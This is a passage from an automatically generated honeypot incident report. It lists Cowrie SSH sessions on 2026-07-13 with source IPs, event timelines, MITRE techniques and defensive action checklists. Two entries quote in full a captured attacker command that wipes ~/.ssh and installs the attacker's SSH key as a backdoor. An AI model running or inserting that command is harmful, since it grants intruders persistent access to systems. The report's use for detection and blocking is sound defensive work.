| `2026-07-13 06:44:58` | `cowrie.login.success` |
| `2026-07-13 06:45:00` | `cowrie.session.params` |
| `2026-07-13 06:45:00` | `cowrie.command.input` |
| `2026-07-13 06:45:00` | `cowrie.log.closed` |
| `2026-07-13 06:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b054020f8077

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:05` | `cowrie.session.connect` |
| `2026-07-13 06:45:05` | `cowrie.client.version` |
| `2026-07-13 06:45:05` | `cowrie.client.kex` |
| `2026-07-13 06:45:06` | `cowrie.login.success` |
| `2026-07-13 06:45:06` | `cowrie.session.params` |
| `2026-07-13 06:45:06` | `cowrie.command.input` |
| `2026-07-13 06:45:07` | `cowrie.log.closed` |
| `2026-07-13 06:45:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2053ff66a04

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:05` | `cowrie.session.connect` |
| `2026-07-13 06:45:05` | `cowrie.client.version` |
| `2026-07-13 06:45:05` | `cowrie.client.kex` |
| `2026-07-13 06:45:06` | `cowrie.login.success` |
| `2026-07-13 06:45:07` | `cowrie.session.params` |
| `2026-07-13 06:45:07` | `cowrie.command.input` |
| `2026-07-13 06:45:07` | `cowrie.command.failed` |
| `2026-07-13 06:45:08` | `cowrie.log.closed` |
| `2026-07-13 06:45:08` | `cowrie.session.params` |
| `2026-07-13 06:45:08` | `cowrie.command.input` |
| `2026-07-13 06:45:08` | `cowrie.session.file_download` |
| `2026-07-13 06:45:08` | `cowrie.log.closed` |
| `2026-07-13 06:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ae78a19f00

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:08` | `cowrie.session.connect` |
| `2026-07-13 06:45:08` | `cowrie.client.version` |
| `2026-07-13 06:45:09` | `cowrie.client.kex` |
| `2026-07-13 06:45:09` | `cowrie.login.success` |
| `2026-07-13 06:45:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-132d1aaac164

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:09` | `cowrie.session.connect` |
| `2026-07-13 06:45:09` | `cowrie.client.version` |
| `2026-07-13 06:45:09` | `cowrie.client.kex` |
| `2026-07-13 06:45:10` | `cowrie.login.success` |
| `2026-07-13 06:45:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee60313cb37

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:12` | `cowrie.session.connect` |
| `2026-07-13 06:45:12` | `cowrie.client.version` |
| `2026-07-13 06:45:12` | `cowrie.client.kex` |
| `2026-07-13 06:45:14` | `cowrie.login.success` |
| `2026-07-13 06:45:16` | `cowrie.session.params` |
| `2026-07-13 06:45:16` | `cowrie.command.input` |
| `2026-07-13 06:45:16` | `cowrie.log.closed` |
| `2026-07-13 06:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d840d6145df9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:20` | `cowrie.session.connect` |
| `2026-07-13 06:45:21` | `cowrie.client.version` |
| `2026-07-13 06:45:21` | `cowrie.client.kex` |
| `2026-07-13 06:45:23` | `cowrie.login.success` |
| `2026-07-13 06:45:26` | `cowrie.session.params` |
| `2026-07-13 06:45:26` | `cowrie.command.input` |
| `2026-07-13 06:45:26` | `cowrie.log.closed` |
| `2026-07-13 06:45:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b009c24e07e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:29` | `cowrie.session.connect` |
| `2026-07-13 06:45:29` | `cowrie.client.version` |
| `2026-07-13 06:45:29` | `cowrie.client.kex` |
| `2026-07-13 06:45:32` | `cowrie.login.success` |
| `2026-07-13 06:45:34` | `cowrie.session.params` |
| `2026-07-13 06:45:34` | `cowrie.command.input` |
| `2026-07-13 06:45:34` | `cowrie.log.closed` |
| `2026-07-13 06:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e71421aa8f8a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:38` | `cowrie.session.connect` |
| `2026-07-13 06:45:38` | `cowrie.client.version` |
| `2026-07-13 06:45:38` | `cowrie.client.kex` |
| `2026-07-13 06:45:40` | `cowrie.login.success` |
| `2026-07-13 06:45:41` | `cowrie.session.params` |
| `2026-07-13 06:45:41` | `cowrie.command.input` |
| `2026-07-13 06:45:41` | `cowrie.log.closed` |
| `2026-07-13 06:45:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40dc21292ac1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:46` | `cowrie.session.connect` |
| `2026-07-13 06:45:47` | `cowrie.client.version` |
| `2026-07-13 06:45:47` | `cowrie.client.kex` |
| `2026-07-13 06:45:50` | `cowrie.login.success` |
| `2026-07-13 06:45:53` | `cowrie.session.params` |
| `2026-07-13 06:45:53` | `cowrie.command.input` |
| `2026-07-13 06:45:53` | `cowrie.log.closed` |
| `2026-07-13 06:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07241051e6a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:45 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:45:54` | `cowrie.session.connect` |
| `2026-07-13 06:45:55` | `cowrie.client.version` |
| `2026-07-13 06:45:55` | `cowrie.client.kex` |
| `2026-07-13 06:45:58` | `cowrie.login.success` |
| `2026-07-13 06:45:59` | `cowrie.session.params` |
| `2026-07-13 06:45:59` | `cowrie.command.input` |
| `2026-07-13 06:46:00` | `cowrie.log.closed` |
| `2026-07-13 06:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e89d9709e42

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:03` | `cowrie.session.connect` |
| `2026-07-13 06:46:04` | `cowrie.client.version` |
| `2026-07-13 06:46:04` | `cowrie.client.kex` |
| `2026-07-13 06:46:07` | `cowrie.login.success` |
| `2026-07-13 06:46:09` | `cowrie.session.params` |
| `2026-07-13 06:46:09` | `cowrie.command.input` |
| `2026-07-13 06:46:09` | `cowrie.log.closed` |
| `2026-07-13 06:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760f34f0fcce

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:04` | `cowrie.session.connect` |
| `2026-07-13 06:46:04` | `cowrie.client.version` |
| `2026-07-13 06:46:05` | `cowrie.client.kex` |
| `2026-07-13 06:46:05` | `cowrie.login.success` |
| `2026-07-13 06:46:05` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:46:05` | `cowrie.direct-tcpip.data` |
| `2026-07-13 06:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1bc8cc6263

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:13` | `cowrie.session.connect` |
| `2026-07-13 06:46:13` | `cowrie.client.version` |
| `2026-07-13 06:46:13` | `cowrie.client.kex` |
| `2026-07-13 06:46:14` | `cowrie.login.success` |
| `2026-07-13 06:46:14` | `cowrie.session.params` |
| `2026-07-13 06:46:14` | `cowrie.command.input` |
| `2026-07-13 06:46:15` | `cowrie.log.closed` |
| `2026-07-13 06:46:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ebac681d7b1

| Field | Detail |
|---|---|
| **Source IP** | `187.56.133[.]95` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:18` | `cowrie.session.connect` |
| `2026-07-13 06:46:18` | `cowrie.client.version` |
| `2026-07-13 06:46:18` | `cowrie.client.kex` |
| `2026-07-13 06:46:19` | `cowrie.login.success` |
| `2026-07-13 06:46:20` | `cowrie.session.params` |
| `2026-07-13 06:46:20` | `cowrie.command.input` |
| `2026-07-13 06:46:20` | `cowrie.command.failed` |
| `2026-07-13 06:46:20` | `cowrie.log.closed` |
| `2026-07-13 06:46:21` | `cowrie.session.params` |
| `2026-07-13 06:46:21` | `cowrie.command.input` |
| `2026-07-13 06:46:21` | `cowrie.session.file_download` |
| `2026-07-13 06:46:21` | `cowrie.log.closed` |
| `2026-07-13 06:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.56.133[.]95` to AbuseIPDB if not already reported
- [ ] Block `187.56.133[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64837abb24a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:21` | `cowrie.session.connect` |
| `2026-07-13 06:46:21` | `cowrie.client.version` |
| `2026-07-13 06:46:21` | `cowrie.client.kex` |
| `2026-07-13 06:46:22` | `cowrie.login.success` |
| `2026-07-13 06:46:23` | `cowrie.session.params` |
| `2026-07-13 06:46:23` | `cowrie.command.input` |
| `2026-07-13 06:46:24` | `cowrie.log.closed` |
| `2026-07-13 06:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3977a614fb

| Field | Detail |
|---|---|
| **Source IP** | `187.56.133[.]95` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:21` | `cowrie.session.connect` |
| `2026-07-13 06:46:21` | `cowrie.client.version` |
| `2026-07-13 06:46:21` | `cowrie.client.kex` |
| `2026-07-13 06:46:22` | `cowrie.login.success` |
| `2026-07-13 06:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.56.133[.]95` to AbuseIPDB if not already reported
- [ ] Block `187.56.133[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0056ebc88a63

| Field | Detail |
|---|---|
| **Source IP** | `187.56.133[.]95` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:22` | `cowrie.session.connect` |
| `2026-07-13 06:46:22` | `cowrie.client.version` |
| `2026-07-13 06:46:22` | `cowrie.client.kex` |
| `2026-07-13 06:46:23` | `cowrie.login.success` |
| `2026-07-13 06:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.56.133[.]95` to AbuseIPDB if not already reported
- [ ] Block `187.56.133[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1620cd72303

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:29` | `cowrie.session.connect` |
| `2026-07-13 06:46:29` | `cowrie.client.version` |
| `2026-07-13 06:46:29` | `cowrie.client.kex` |
| `2026-07-13 06:46:31` | `cowrie.login.success` |
| `2026-07-13 06:46:34` | `cowrie.session.params` |
| `2026-07-13 06:46:34` | `cowrie.command.input` |
| `2026-07-13 06:46:34` | `cowrie.log.closed` |
| `2026-07-13 06:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ca55b970ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:37` | `cowrie.session.connect` |
| `2026-07-13 06:46:37` | `cowrie.client.version` |
| `2026-07-13 06:46:37` | `cowrie.client.kex` |
| `2026-07-13 06:46:38` | `cowrie.login.success` |
| `2026-07-13 06:46:39` | `cowrie.session.params` |
| `2026-07-13 06:46:39` | `cowrie.command.input` |
| `2026-07-13 06:46:40` | `cowrie.log.closed` |
| `2026-07-13 06:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39d6499d6190

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:46` | `cowrie.session.connect` |
| `2026-07-13 06:46:46` | `cowrie.client.version` |
| `2026-07-13 06:46:46` | `cowrie.client.kex` |
| `2026-07-13 06:46:46` | `cowrie.login.success` |
| `2026-07-13 06:46:47` | `cowrie.session.params` |
| `2026-07-13 06:46:47` | `cowrie.command.input` |
| `2026-07-13 06:46:47` | `cowrie.log.closed` |
| `2026-07-13 06:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2342f1af2baf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:46 |
| **Last Seen** | 2026-07-13 06:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:46:54` | `cowrie.session.connect` |
| `2026-07-13 06:46:54` | `cowrie.client.version` |
| `2026-07-13 06:46:54` | `cowrie.client.kex` |
| `2026-07-13 06:46:55` | `cowrie.login.success` |
| `2026-07-13 06:46:57` | `cowrie.session.params` |
| `2026-07-13 06:46:57` | `cowrie.command.input` |
| `2026-07-13 06:46:57` | `cowrie.log.closed` |
| `2026-07-13 06:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f602fae0c209

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:02` | `cowrie.session.connect` |
| `2026-07-13 06:47:02` | `cowrie.client.version` |
| `2026-07-13 06:47:02` | `cowrie.client.kex` |
| `2026-07-13 06:47:04` | `cowrie.login.success` |
| `2026-07-13 06:47:05` | `cowrie.session.params` |
| `2026-07-13 06:47:05` | `cowrie.command.input` |
| `2026-07-13 06:47:05` | `cowrie.log.closed` |
| `2026-07-13 06:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2bac82ac6a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:11` | `cowrie.session.connect` |
| `2026-07-13 06:47:11` | `cowrie.client.version` |
| `2026-07-13 06:47:11` | `cowrie.client.kex` |
| `2026-07-13 06:47:12` | `cowrie.login.success` |
| `2026-07-13 06:47:13` | `cowrie.session.params` |
| `2026-07-13 06:47:13` | `cowrie.command.input` |
| `2026-07-13 06:47:14` | `cowrie.log.closed` |
| `2026-07-13 06:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]128` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce816fb7056

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]128` |
| **First Seen** | 2026-07-13 06:47 |
| **Last Seen** | 2026-07-13 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:47:19` | `cowrie.session.connect` |
| `2026-07-13 06:47:19` | `cowrie.client.version` |
| `2026-07-13 06:47:19` | `cowrie.client.kex` |
| `2026-07-13 06:47:20` | `cowrie.login.success` |
| `2026-07-13 06:47:22` | `cowrie.session.params` |
